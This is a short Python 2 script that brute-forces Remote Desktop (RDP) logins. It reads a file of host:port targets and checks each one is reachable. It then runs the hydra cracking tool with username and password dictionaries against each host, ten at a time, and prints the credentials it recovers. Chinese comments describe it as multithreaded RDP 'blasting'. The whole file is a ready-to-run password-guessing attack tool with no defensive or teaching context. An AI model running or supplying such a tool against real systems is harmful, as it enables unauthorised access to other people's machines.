#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import socket
import subprocess
import re
import os
"""
没有对应的python rdp库，感觉很崩
"""

def connectToHp(host,port):
    #查看是不是主机和port不能连接
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(10)
    try:
        sk.connect((host,port))
        sk.close()
        return True
    except Exception:
        print "\33[34mbad connection to "+host+':'+str(port)+'\33[37m'
        return False

def explode(host,port):
    if not connectToHp(host,port):
        return
    explodeListHp(host+':'+str(port))

def explodeListHp(hp):
    curPath = os.path.split(os.path.realpath(__file__))[0]
    print 'rdper start explode '+hp+'\n'
    host = hp.split(':')[0]
    port = int(hp.split(':')[1])
    #查看是不是主机和port不能连接
    if not connectToHp(host,port):
        return
    argsArr = ['hydra','-L',curPath+'/../dict/rdp_u.dic','-P',curPath+'/../dict/rdp_p.dic']
    proco = 'rdp://'+host
    if not port==3389:
        proco = proco+':'+str(port)
    argsArr.append(proco)
    handle = open(curPath+'/../logs/hydra.log','wt')
    hydraPro = subprocess.Popen(argsArr, stdout=subprocess.PIPE,stderr=handle)
    hydraPro.wait()
    hydraRes = hydraPro.stdout.read()
    resultArr = re.findall(r'\[3389\]\[rdp\] (.+)',hydraRes)
    for result in resultArr:
        print '\33[33mrdp\t'+result+'\33[37m'



if __name__ == '__main__':
    if len(sys.argv)!=2:
        print "please indicate the file path"
        sys.exit(2)
    file_path = sys.argv[1]
    hpArr = []
    try:
        f = open(file_path,'r')
        for hp in f.readlines():
            hpArr.append(hp.strip('\n'))
        f.close()
    except:
        print "file path ill legal"
        sys.exit(2)
    #多线程爆破rdp
    import threadpool
    pool = threadpool.ThreadPool(10)
    requests = threadpool.makeRequests(explodeListHp, hpArr)
    [pool.putRequest(req) for req in requests]
    pool.wait()
    pool.dismissWorkers(10, do_join=True)
